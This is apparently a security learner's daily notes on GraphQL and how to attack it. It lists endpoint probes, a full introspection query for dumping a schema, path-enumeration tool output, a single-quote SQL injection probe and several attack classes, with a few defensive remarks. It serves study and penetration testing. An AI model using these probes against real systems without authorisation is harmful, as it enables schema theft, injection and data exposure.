`4 January 2023`
## **Day 18 What I Have Learned**
***
## **GraphQL Part 1**:
- The GraphQL query language is strongly typed. Due to its strong type system, GraphQL gives you the ability to query and understand the underlying schema.
- GraphQL is a query language for your API, and a server-side runtime for executing queries using a type system you define for your data. GraphQL isn't tied to any specific database or storage engine and is instead backed by your existing code and data.
- [More](https://graphql.org/learn/).
***
## **Exploit**:
1. Identify An Injection Point
- Most of the time the graphql is located on the /graphql or /graphiql endpoint.
- example.com/graphql?query={__schema{types{name}}}
- example.com/graphiql?query={__schema{types{name}}}
2. Check If Errors Are Visible.
- ?query={__schema}.
- ?query={}
- ?query={thisdefinitelydoesnotexist}
3. Enumerate Database Schema via Introspection
- Single line query to dump the database schema without fragments.

```js
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```
4. Or Use a tool
```js
git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```
5. Extract data
- Example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
6. SQL injection
- Send a single quote ' inside a graphql parameter to trigger the SQL injection
``` js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```
7. [More](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

## **Attacks in GraphQL**:
1. Unauthenticated Access to GraphQL Endpoint 
- Supposed your target runs GraphQL, now as an unauthenticated user hit the following URL: 
https://your_target/graphiql
- If you are able to access the GraphQL Console, try running some schema extraction or other queries
- Alternatively you can also try to query https://your_target_url/graphql?query={query_here} 
- If you are able to extract information as an unauthenticated user, this is an issue.
2. Introspection Queries are Enabled
- A GraphQL server supports introspection over its schema using the same GraphQL query language.
- A server exposes the following introspection queries on the Query operation type.
__schema
__type
__typename
- Note that introspection queries start with __
3. GraphQL in Debug Mode
- GraphQL can be run in “debug” mode. The main feature of debug is to display detailed errors of request to aid with development. This is extremely problematic if you run your GraphQL implementation in production with debug enabled. Doing so will result in excessive errors, such as stack traces, and it exposes other sensitive information in the response, which jeopardizes not just security, but compliance adherence, too.  
4. Application Level DoS
- [Info Here](https://payatu.com/blog/manmeet/graphql-exploitation-part-4).
5. SQL Injection
- Send a single quote ' inside a graphql parameter to trigger the SQL injection.
6. IDOR
- [Info Here](https://infosecwriteups.com/graphql-idor-leads-to-information-disclosure-175eb560170d).
7. Data Exposure through Error Messages
- Instead of returning something like "Did you mean that query", it is preferable to return something along the lines of "That query doesn't exist" without providing alternatives.
- [Info Here](https://escape.tech/blog/graphql-verbose-error-suggestions/).
8. Misc. GraphQL Attacks
- [Info Here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql).
***